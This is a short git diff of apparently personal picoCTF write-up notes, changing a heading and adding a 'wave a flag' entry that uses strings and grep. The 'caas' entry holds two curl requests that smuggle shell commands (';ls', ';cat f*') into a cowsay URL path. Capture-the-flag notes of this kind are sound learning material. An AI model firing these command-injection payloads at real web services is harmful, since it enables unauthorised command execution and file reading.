@@ -92,10 +92,15 @@ $ wget _ _ _ && cat pw.txt | python3 ende.py -d flag.txt.en
 # :baseball: - login - `200`
 ###### hint: base64
 
-## :cow: - caas - `202`
+# :cow: - caas - `202`
 ```sh
 $ curl "https://caas.mars.picoctf.net/cowsay/pwd;ls"
 $ curl "https://caas.mars.picoctf.net/cowsay/xxx;cat f*"
 ```
 
 [github flavor emoji list](https://gist.github.com/rxaviers/7360908)
+
+# :rainbow_flag: - wave a flag - `170`
+```sh
+$ strings warm | grep pico
+```
